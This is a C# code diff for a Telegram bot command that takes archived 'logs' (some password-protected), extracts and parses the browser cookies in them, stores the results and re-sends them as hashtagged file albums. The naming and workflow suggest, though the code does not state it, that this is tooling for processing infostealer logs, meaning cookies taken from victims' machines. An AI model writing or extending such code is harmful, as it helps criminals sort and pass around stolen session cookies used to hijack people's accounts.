@@ -1,6 +1,6 @@
-using System.Text.RegularExpressions;
 using Core.Models.Configs;
 using Core.Parsers;
+using Microsoft.EntityFrameworkCore;
 using TelegramBot.Data;
 using TelegramBot.Extensions;
 using TelegramBot.Models;
@@ -15,60 +15,58 @@ namespace TelegramBot.Commands.Main;
 
 public class CookiesCommand(Client client, AppDbContext context, ParsingConfig cfgParse, DataService data) : ICommand, ICallbackCommand
 {
-    private static readonly Regex _password = new(@"(P|p)?ass(word)?.?[a-zA-Z0-9]*?\s?(:|-)?\s?(.+)($|\n)");
+    public bool AuthorizedOnly { get; } = true;
 
-    public async Task Invoke(UpdateBotCallbackQuery update, User user)
+    Task ICommand.Invoke(UpdateNewMessage update, User user) =>
+        client.SendMessageAvailableLogs(
+            user,
+            data,
+            "Cookies\nSelect logs");
+
+    async Task ICallbackCommand.Invoke(UpdateBotCallbackQuery update, User user)
     {
         if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not
             { } logsname) return;
+        
+        // TODO extract into method
+
+        if (await TrySendUploadedAsync(user, logsname))
+            return;
 
         await ProcessArchive(update.msg_id, user, logsname, null);
     }
 
-    public bool AuthorizedOnly { get; } = true;
-
-    public Task Invoke(UpdateNewMessage update, User user)
+    private async Task<bool> TrySendUploadedAsync(InputPeer peer, string logsname)
     {
-        App.Hooks.Add(update.message.Peer.ID, HandleCookiesAsync);
+        var uploaded = context.Files!
+               .Where(x => x.LogsName == logsname)
+               .Where(x => x.Category == "Cookies");
 
-        return client.SendMessageAvailableLogs(
-            user,
-            data,
-            "Cookies\nSend zip/rar file with logs or select downloaded cookies",
-            new[]
-            {
-                new KeyboardButtonRow
+        if (!await uploaded.AnyAsync())
+            return false;
+
+        await client.SendAlbumAsync(
+            peer,
+            await uploaded
+                  .Select(x => (InputMedia) new InputDocument
+                  {
+                      id = x.Id,
+                      access_hash = x.AccessHash,
+                      file_reference = x.FileReference
+                  })
+                  .ToListAsync(),
+            caption: $"#Cookies\n{logsname}",
+            entities: 
+            [
+                new MessageEntityHashtag
                 {
-                    buttons =
-                    [
-                        new KeyboardButtonCallback
-                        {
-                            text = "Cancel",
-                            data = "Cancel"u8.ToArray()
-                        }
-                    ]
+                    length = "#Cookies".Length,
+                    offset = 0
                 }
-            });
-    }
+            ]
+        );
 
-    private async Task HandleCookiesAsync(UpdateNewMessage update, User user)
-    {
-        var msg = update.message as Message;
-
-        if (msg?.message is not { Length: > 0 } filepath)
-        {
-            filepath = await data.DownloadFileFromMessageAsync(user, update);
-
-            if (filepath is null) return;
-        }
-
-        string? password =
-            _password.Match(((Message)update.message).message).Groups[4]
-                is { Success: true, Value: not "none" and "\u2796" } result
-                ? result.Value
-                : null;
-        
-        await ProcessArchive(update.message.ID, user, filepath, password);
+        return true;
     }
 
     private async Task ProcessArchive(int messageId, InputPeer peer, string logsname, string? password)
@@ -76,14 +74,14 @@ public class CookiesCommand(Client client, AppDbContext context, ParsingConfig c
         await client.EditMessage(peer, messageId, $"Cookies\nStart parsing cookies from {logsname}");
         
         if (data.GetLogsPath(logsname) is not { } zippath ||
-            await data.ExtractFilesAsync(peer, zippath, password) is not { } dir)
+            data.ExtractFiles(zippath, password) is not { } dir)
         {
             dir = data.GetExtractedPath(logsname);
 
             if (!Directory.Exists(dir)) return;
         }
 
-        var files = await ParseCookies(logsname, dir);
+        var files = await ParseCookies(dir);
         
         await client.EditMessage(peer, messageId, $"Cookies\n{logsname} successfully processed");
         
@@ -105,7 +103,7 @@ public class CookiesCommand(Client client, AppDbContext context, ParsingConfig c
         await SaveFilesData(messages, logsname);
     }
 
-    private async Task<IEnumerable<InputFileBase>> ParseCookies(string filename, string logs)
+    private async Task<IEnumerable<InputFileBase>> ParseCookies(string logs)
     {
         var files = new List<InputFileBase>();
         
@@ -135,7 +133,7 @@ public class CookiesCommand(Client client, AppDbContext context, ParsingConfig c
             Id = x.id,
             AccessHash = x.access_hash,
             FileReference = x.file_reference,
-            Type = new FileInfo(x.Filename).Name,
+            Type = x.Filename,
             Category = "Cookies",
             LogsName = logsname
         }));
